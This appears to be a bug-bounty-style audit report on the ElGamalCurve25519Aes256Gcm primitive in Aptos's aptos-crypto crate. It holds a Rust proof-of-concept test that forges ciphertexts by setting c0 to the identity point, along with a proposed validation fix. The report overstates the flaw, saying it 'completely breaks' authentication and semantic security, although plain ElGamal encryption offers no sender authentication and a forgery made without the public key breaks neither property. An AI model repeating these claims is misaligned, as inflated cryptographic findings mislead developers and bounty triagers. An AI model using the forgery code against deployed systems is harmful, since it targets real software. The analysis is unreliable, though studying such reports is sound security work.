# Audit Report

## Title
Identity Point Bypass in ElGamalCurve25519Aes256Gcm Enables Chosen-Ciphertext Forgery

## Summary
The `dec()` function in `ElGamalCurve25519Aes256Gcm` fails to properly validate the ciphertext component `c0`. When an attacker submits a malicious ciphertext with `c0` set to the identity point (not `c1` as the question suggests), the ElGamal decryption always returns `c1` unchanged. This allows an attacker to forge valid-appearing ciphertexts without knowing the recipient's public key, completely breaking the authentication and semantic security of the encryption scheme. However, this cryptographic primitive is **not currently used** anywhere in the Aptos blockchain protocol, limiting immediate practical impact.

## Finding Description

The ElGamal decryption operation computes: `plaintext = c1 - sk*c0` [1](#0-0) 

When `c0` is set to the identity point:
- The computation becomes: `plaintext = c1 - sk*identity`
- In any group, scalar multiplication with the identity always yields the identity: `sk*identity = identity`
- Therefore: `plaintext = c1 - identity = c1`

The decryption function performs torsion-free validation on both `c0` and `c1` [2](#0-1) , but the identity point in Edwards curve form (0,1) **is** torsion-free as it belongs to the prime-order subgroup. These checks therefore pass, allowing the attack.

**Attack Path:**
1. Attacker chooses any known group element `M` (e.g., the generator `G`)
2. Attacker computes the deterministic AES key: `SHA3-256("DST__AES_KEY_DERIVATION" || M.compress())` [3](#0-2) 
3. Attacker encrypts chosen malicious payload with this predicted AES key
4. Attacker crafts ciphertext: `[identity_bytes || M_bytes || nonce || malicious_aes_ciphertext]`
5. Victim decrypts and obtains: `aes_key_element = M` (since `c1 - sk*identity = M`)
6. Victim derives the same AES key the attacker used
7. Victim successfully decrypts the attacker's chosen payload
8. Victim has no way to distinguish this from legitimately encrypted data

This is a **chosen-ciphertext attack** that completely breaks:
- **Authentication**: Attacker forges ciphertexts without the public key
- **Semantic Security**: Attacker injects arbitrary chosen plaintexts
- **Cryptographic Correctness Invariant**: Violates the requirement that cryptographic operations must be secure

## Impact Explanation

**Current Impact: Low/None**

Based on extensive code search, `ElGamalCurve25519Aes256Gcm` is defined in the aptos-crypto crate but is **not currently used** anywhere in the Aptos blockchain core protocol (consensus, execution, storage, governance, staking, or networking components).

The encryption scheme is exported as a public API [4](#0-3)  but has no internal consumers.

**Potential Future Impact: Critical**

If this encryption scheme were integrated into:
- **Validator communication**: Could enable message injection attacks
- **Encrypted transaction data**: Could enable transaction forgery
- **Key exchange protocols**: Could enable man-in-the-middle attacks
- **Any authentication mechanism**: Would be completely broken

Since this is a public API, external projects building on Aptos could unknowingly use this broken primitive, leading to security failures in their systems.

**Severity Assessment:**
Per the Aptos bug bounty criteria, this currently falls into **Low Severity** ("Non-critical implementation bugs") rather than Medium/High/Critical, because:
- No funds are at risk (not used in any financial logic)
- No consensus impact (not used in consensus)
- No state corruption (not used in state management)
- No current attack surface on the live blockchain

However, this represents a **critical cryptographic design flaw** that should be fixed before potential future use.

## Likelihood Explanation

**Exploitation Likelihood: High** (if the API were used)

The attack is:
- **Trivial to execute**: Requires only crafting a specific byte sequence
- **100% reliable**: Deterministic attack with no failure cases
- **Requires no special knowledge**: Attacker doesn't need the private or public key
- **Undetectable**: Victim cannot distinguish forged from legitimate ciphertexts

**Current Exploitation Likelihood: None**

Since the encryption scheme is not integrated into any Aptos protocol component, there is currently no attack surface to exploit.

## Recommendation

**Immediate Fix**: Add explicit identity point validation in the `dec()` function:

```rust
fn dec(sk: &Scalar, ciphertext: &[u8]) -> anyhow::Result<Vec<u8>> {
    // ... existing length and decompression checks ...
    
    ensure!(
        c0.is_torsion_free(),
        "ElGamalCurve25519Aes256Gcm dec failed with non-prime-order c0"
    );
    
    // ADD THIS CHECK:
    ensure!(
        c0 != EdwardsPoint::identity(),
        "ElGamalCurve25519Aes256Gcm dec failed with identity point c0"
    );
    
    ensure!(
        c1.is_torsion_free(),
        "ElGamalCurve25519Aes256Gcm dec failed with non-prime-order c1"
    );
    
    // ADD THIS CHECK:
    ensure!(
        c1 != EdwardsPoint::identity(),
        "ElGamalCurve25519Aes256Gcm dec failed with identity point c1"
    );
    
    // ... rest of function ...
}
```

**Additional Recommendations:**
1. Add the same validation to `enc()` for the public key parameter (already present but verify)
2. Add comprehensive test cases for identity point attacks
3. Consider whether this encryption scheme is needed - if unused, consider deprecating it
4. If future use is planned, conduct a full cryptographic audit of the implementation

## Proof of Concept

```rust
#[cfg(test)]
mod identity_point_attack {
    use super::*;
    use curve25519_dalek::edwards::EdwardsPoint;
    use aes_gcm::{Aes256Gcm, KeyInit, Nonce, aead::Aead};
    use sha3::{Digest, Sha3_256};

    #[test]
    fn test_identity_c0_forgery() {
        // Setup: Generate legitimate keypair for victim
        let mut rng = rand_core::OsRng;
        let (sk, _pk) = ElGamalCurve25519Aes256Gcm::key_gen(&mut rng);
        
        // Attacker chooses the generator as the "encrypted" AES key
        let chosen_element = curve25519_dalek::constants::ED25519_BASEPOINT_POINT;
        
        // Attacker pre-computes the AES key that will be derived
        let mut hasher = Sha3_256::new();
        hasher.update(b"DST__AES_KEY_DERIVATION");
        hasher.update(chosen_element.compress().to_bytes());
        let predicted_aes_key_bytes = hasher.finalize();
        
        // Attacker encrypts malicious message with predicted key
        let malicious_msg = b"Injected by attacker without knowing public key!";
        let key = aes_gcm::Key::<Aes256Gcm>::from_slice(&predicted_aes_key_bytes);
        let cipher = Aes256Gcm::new(key);
        let nonce = Aes256Gcm::generate_nonce(&mut aes_gcm::aead::OsRng);
        let aes_ciphertext = cipher.encrypt(&nonce, malicious_msg.as_ref()).unwrap();
        
        // Attacker crafts malicious ciphertext with c0 = identity, c1 = chosen_element
        let identity = EdwardsPoint::identity();
        let forged_ciphertext = [
            identity.compress().to_bytes().to_vec(),           // c0 = identity (32 bytes)
            chosen_element.compress().to_bytes().to_vec(),     // c1 = chosen element (32 bytes)
            nonce.to_vec(),                                    // nonce (12 bytes)
            aes_ciphertext,                                    // encrypted malicious data
        ].concat();
        
        // Victim decrypts the forged ciphertext
        let decrypted_result = ElGamalCurve25519Aes256Gcm::dec(&sk, &forged_ciphertext);
        
        // VULNERABILITY: Decryption succeeds and returns attacker's chosen message!
        assert!(decrypted_result.is_ok(), "Forged ciphertext should decrypt successfully");
        assert_eq!(decrypted_result.unwrap(), malicious_msg, 
                   "Victim receives attacker's message without attacker knowing the public key!");
    }
    
    #[test]
    fn test_identity_passes_torsion_check() {
        // Verify that the identity point incorrectly passes the torsion-free check
        let identity = EdwardsPoint::identity();
        assert!(identity.is_torsion_free(), 
                "Identity point passes torsion-free check, enabling the attack");
    }
}
```

This PoC demonstrates that an attacker can forge valid-appearing ciphertexts that decrypt successfully, without ever knowing or using the recipient's public key. The attack succeeds because the identity point passes the `is_torsion_free()` validation despite enabling this cryptographic bypass.

## Notes

**Critical Clarification**: The security question asks about setting `c1` to the identity point, but the actual vulnerability is when `c0` (not `c1`) is set to the identity point. When `c0 = identity`, the decryption formula `c1 - sk*c0` simplifies to `c1 - identity = c1`, returning `c1` unchanged regardless of its value. Setting only `c1` to identity (with arbitrary `c0`) does not cause this bypass.

**Current Risk Level**: While this is a critical flaw in the cryptographic implementation, the immediate risk to the Aptos blockchain is **minimal** because this encryption scheme is not integrated into any protocol component. It exists as a public API primitive that could be used in future features or by external projects.

**Action Required**: This should be fixed proactively before any future use, as the bug completely breaks the security properties of the encryption scheme.

### Citations

**File:** crates/aptos-crypto/src/elgamal/mod.rs (L62-69)
```rust
/// ElGamal decryption.
pub fn decrypt<G: ElGamalFriendlyGroup>(
    sk: &G::Scalar,
    c0: &G::Element,
    c1: &G::Element,
) -> G::Element {
    G::sub(c1, &G::mul(c0, sk))
}
```

**File:** crates/aptos-crypto/src/asymmetric_encryption/elgamal_curve25519_aes256_gcm.rs (L31-36)
```rust
    fn hash_group_element_to_aes_key(element: &CompressedEdwardsY) -> Vec<u8> {
        let mut hasher = Sha3_256::new();
        hasher.update(b"DST__AES_KEY_DERIVATION");
        hasher.update(element.to_bytes());
        hasher.finalize().to_vec()
    }
```

**File:** crates/aptos-crypto/src/asymmetric_encryption/elgamal_curve25519_aes256_gcm.rs (L109-123)
```rust
        ensure!(
            c0.is_torsion_free(),
            "ElGamalCurve25519Aes256Gcm dec failed with non-prime-order c0"
        );

        let c1 = CompressedEdwardsY::from_slice(&ciphertext[32..64])
            .decompress()
            .ok_or_else(|| {
                anyhow!("ElGamalCurve25519Aes256Gcm dec failed with invalid c1 element")
            })?;

        ensure!(
            c1.is_torsion_free(),
            "ElGamalCurve25519Aes256Gcm dec failed with non-prime-order c1"
        );
```

**File:** crates/aptos-crypto/src/lib.rs (L9-9)
```rust
pub mod asymmetric_encryption;
```
